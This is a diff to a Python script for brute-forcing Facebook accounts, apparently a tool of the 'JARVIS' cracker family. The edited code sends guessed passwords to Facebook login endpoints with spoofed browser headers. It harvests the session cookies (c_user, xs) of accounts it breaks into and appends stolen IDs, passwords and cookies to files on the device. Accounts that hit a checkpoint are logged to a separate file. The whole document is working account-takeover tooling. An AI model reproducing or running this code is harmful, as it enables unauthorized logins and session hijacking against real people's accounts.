@@ -276,7 +276,7 @@ def lumd():
     print(logo)
     print('\033[1;92mChecking Approval ....\033[0;97m')
     try:
-        httpCaht = requests.get('').text
+        httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
         t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
         t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
         uid = os.getuid()
@@ -355,8 +355,8 @@ def cracker(ids,passlist):
             requu1 = session.get(url1)
             log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
             #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            headers = {"authority": "touch.facebook.com",
+            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            headers = {"authority": "mbasic.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified%26cbt%3D1734959969869&lwv=100",
             "scheme": "https",
@@ -366,7 +366,7 @@ def cracker(ids,passlist):
             "cache-control": "max-age=0",
             "content-type": "application/x-www-form-urlencoded",
             "dpr": "3",
-            "origin": "https://touch.facebook.com",
+            "origin": "https://mbasic.facebook.com",
             "referer": "https://www.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%23_%3D_&display=page&locale=bn_IN&pl_dbl=0",
             "sec-ch-prefers-color-scheme": "light",
             "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
@@ -481,52 +481,40 @@ def crackerr(ids,passlist):
             "upgrade-insecure-requests": "1",
             "user-agent": us,
             "viewport-width": "980"}
-            free_fb = session.get(url1,headers=head).text
-            log_data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
-            'lgnrnd': '025924_Hv1B',
-            'lgnjs': '1735383565',
-            'email': ids,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPA^%^2FPPPvfBFAI',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
-            url = "https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
-            headers = {
-            'user-agent': us,
-            'Accept-Encoding': 'gzip, deflate',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Connection': 'keep-alive',
-            'Host': 'x.prod.facebook.com',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '3',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'viewport-width': '980'}
+            requu1 = session.get(url1,headers=head)
+            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
+            headers = {"authority": "www.facebook.com",
+            "method": "POST",
+            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
+            "scheme": "https",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "dpr": "3",
+            "origin": "https://www.facebook.com",
+            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-platform": "\"Linux\"",
+            "sec-ch-ua-platform-version": "\"\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+           "sec-fetch-site": "same-origin",
+           "sec-fetch-user": "?1",
+           "upgrade-insecure-requests": "1",
+           "user-agent": us,
+           "viewport-width": "980"}
             response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                kuki = convert(session.cookies.get_dict())
-                #kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                #kuki = convert(session.cookies.get_dict())
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 xs_value = None
                 for part in kuki.split(';'):
@@ -538,14 +526,14 @@ def crackerr(ids,passlist):
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
                         print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
                         open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
                         print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
                         open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
@@ -553,7 +541,7 @@ def crackerr(ids,passlist):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                 open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
@@ -566,4 +554,4 @@ def crackerr(ids,passlist):
         pass
 
 
-m()
+__iam_a_porche()
